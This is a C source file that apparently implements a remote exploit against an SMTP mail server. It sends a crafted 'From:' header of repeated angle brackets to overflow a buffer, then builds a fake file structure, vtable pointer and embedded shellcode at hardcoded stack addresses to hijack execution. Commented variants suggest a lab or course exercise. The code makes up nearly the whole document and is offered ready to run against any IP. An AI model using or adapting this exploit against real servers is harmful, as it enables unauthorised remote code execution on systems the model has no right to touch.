#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <strings.h>
#include <string.h>

#define SMTP_PORT 25
#define IP_LEN	16
#define MAX_SIZE 2048
#define ANGLE_MAX 306

char shellcode[]=               /* 24 bytes                       */
    "\xeb\x02"                  /* jmp    <shellcode+4>           */
    "\xeb\x08"                  /* jmp    <shellcode+12>          */
    "\xe8\xf9\xff\xff\xff"      /* call   <shellcode+2>           */
    "\xcd\x7f"                  /* int    $0x7f                   */
    "\xc3"                      /* ret                            */
    "\x5f"                      /* pop    %edi                    */
    "\xff\x47\x01"              /* incl   0x1(%edi)               */
    "\x57"                  	/* push  %edi                     */
    "\x6a\x01"                  /* push 0x01                      */
    "\x58"                      /* pop    %eax                    */
    "\x6a\x02"                  /* push 0x02                      */
    "\x5b"                      /* pop    %ebx                    */
    "\xc3"                      /* ret                            */
;

void Send(int sock,char *data,char resp);

int main(int argc, char* argv[])
{
	
	int sock_target = 0;
	char targetIp[IP_LEN];
	memset(targetIp, 0, IP_LEN);
	if(argc < 2)
	{
			printf("Usage: ./a.out <IP_ADDRESS_TARGET>\n");
			return 0;
	}
	if(strlen(argv[1]) > IP_LEN)
	{
			printf("Please enter a buffer of len < 16\n");
			return 0;
	}
	strcpy(targetIp, argv[1]);
	
	char buf[MAX_SIZE];
	char cpy[MAX_SIZE];
	int i;
	int j;
	int count =0, ct=0;
	int sptr, aptr, fptr;
	int aidx, sidx;
	int shellIndex;

	sock_target = socket(AF_INET,SOCK_STREAM,0);
	struct sockaddr_in target_addr;
	bzero(&target_addr,sizeof(target_addr));
	target_addr.sin_family=AF_INET;
	target_addr.sin_port=htons(25);
	target_addr.sin_addr.s_addr=inet_addr(targetIp);
	if (connect(sock_target,(struct sockaddr*)&target_addr,sizeof(target_addr))<0) 
	{
		perror("Connect");
		exit(0);
	}
	Send(sock_target,"HELO yahoo.com\n",2);
	Send(sock_target,"MAIL FROM: kracker@gmail.com\n",1);
	Send(sock_target,"RCPT TO:  MAILER-DAEMON\n",1);
	Send(sock_target,"DATA\n",1);
	for(i = 0 ; i < ANGLE_MAX; )
	{
		buf[i++]='<';
		buf[i++]='>';
	}

	//Putting in the address of put MCI structure with patched values
	buf[i++] = 0x1c;
	buf[i++] = 0xa0;
	buf[i++] = 0xff;
	buf[i++] = 0xbf;
	
	buf[i++]= 0;
	sprintf(cpy,"From: %s \n", buf);
	Send(sock_target, cpy, 0);
	Send(sock_target, "Subject:hack\n", 0);
	memset(buf, 0xf8, MAX_SIZE);
	
	// We know that 0xbfffa01c is the address of buf[432] in the actual machine
	
	buf[432] = 0x20;
	buf[433] = 0xa0;
	buf[434] = 0xff;
	buf[435] = 0xbf;
	
	//mci_out
	buf[436 + 0x18] = 0x3c;
	buf[437 + 0x18] = 0xa3;
	buf[438 + 0x18] = 0xff;
	buf[439 + 0x18] = 0xbf;
	
	//mci_mailer
	buf[436 + 0x24] = 0x20;
	buf[437 + 0x24] = 0xa6;
	buf[438 + 0x24] = 0xff;
	buf[439 + 0x24] = 0xbf;
	
	//mci_host
	buf[436 + 0x28] = 0x64;
	buf[437 + 0x28] = 0xa6;
	buf[438 + 0x28] = 0xff;
	buf[439 + 0x28] = 0xbf;

	/*We leave a gap of 800 starting from 0xbfffa01c before we begin the file pointer. Hence, we locate the file
	 * pointer at 0xbfffa01c (16) + 800 bytes = 0xbfffa33c*/
	
	// This is location 0xbfffa33c
	//Flags for struct file
	buf[432 + 800 + 0] = 0x01;
	buf[432 + 800 + 1] = 0x01;
	buf[432 + 800 + 2] = 0x01;
	buf[432 + 800 + 3] = 0x01;
	
	
	//location of the _vptr_offset in struct file that starts at buf[432 + 800 + 0]
	buf[432 + 800 + 70] = 0xfc; // the vptr will be contained at file end - 4 bytes 

	// Our jump pointer - at end - 4  
	buf[432 + 800 + 144] = 0xd0;
	buf[432 + 800 + 145] = 0xa3;
	buf[432 + 800 + 146] = 0xff;
	buf[432 + 800 + 147] = 0xbf;
	
	
	
	//BFFFA3D0 is the location of the file end, where the jump pointer points. This is the starting of vtable
	// at the 28th byte, we have the jump address to our code, which is supposed to point to __xsputn  -- 4011bfe0
	
	//Seg Fault
	/*buf[432 + 800 + 148 + 28] = 0xdd;
	buf[432 + 800 + 148 + 29] = 0xcc;
	buf[432 + 800 + 148 + 30] = 0xbb;
	buf[432 + 800 + 148 + 31] = 0xaa;
	*/
	
	//run the code of out choice (exit(2))
	/*buf[432 + 800 + 148 + 28] = 0xd0;
	buf[432 + 800 + 148 + 29] = 0xa3;
	buf[432 + 800 + 148 + 30] = 0xff;
	buf[432 + 800 + 148 + 31] = 0xbf;
	*/
	
	// Run abort
	/*buf[432 + 800 + 148 + 28] = 0x60;
	buf[432 + 800 + 148 + 29] = 0xad;
	buf[432 + 800 + 148 + 30] = 0x11;
	buf[432 + 800 + 148 + 31] = 0x40;
	*/
	
	// Run impossible
	buf[432 + 800 + 148 + 28] = 0xa0;
	buf[432 + 800 + 148 + 29] = 0xbf;
	buf[432 + 800 + 148 + 30] = 0x06;
	buf[432 + 800 + 148 + 31] = 0x08;
	
	//Run Fork

	//&Fork = 0x4018fa40
	/*buf[432 + 800 + 148 + 28] = 0x40;
	buf[432 + 800 + 148 + 29] = 0xfa;
	buf[432 + 800 + 148 + 30] = 0x18;
	buf[432 + 800 + 148 + 31] = 0x40;
	*/
	
	//The shellcode is at bfffa3d0 - just 24 bytes, fits before the 28th offset of the jump index 
	for(i = 0 ; i < strlen(shellcode) ; i ++)
	{
			buf[432 + 800 + 148 + i ] = shellcode[i];
	}

	
    buf[MAX_SIZE-1] = '\n';
    buf[MAX_SIZE-1] = 0;
	Send(sock_target,buf,0);
	Send(sock_target,"\n",0);
	Send(sock_target,".\n",1);

}

void Send(int sock,char *data,char resp) {
	char buf[1024];
	int i;
	if (send(sock,data,strlen(data),0)<0) 
	{
		perror("Send");
		exit(0);
	}
	while(resp--) 
	{
		if ((i=recv(sock,buf,sizeof(buf),0))<0) 
		{
			perror("error");
			exit(0);
		}
		buf[i]=0;
		printf("%s",buf);
	}
 }


